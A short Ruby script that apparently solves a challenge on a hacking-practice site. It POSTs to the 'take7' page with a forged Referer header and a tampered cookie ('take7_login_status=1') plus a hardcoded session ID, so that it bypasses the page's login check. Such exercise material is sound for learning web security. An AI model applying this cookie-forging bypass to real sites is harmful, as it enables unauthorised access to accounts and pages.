#!/usr/bin/ruby
require 'net/http'
uri=URI.parse('http://www.hackerschool.jp/hack/take7.php')
Net::HTTP.start(uri.host){|http|
	resp=http.post(
		uri.path,
		'login=',
		{
			'Referer'=>uri.to_s,
			'Cookie'=>'take7_login_status=1;PHPSESSID=bcffklhro87elkfgncbufgqvm1;',
		}
	)
	puts resp.body
}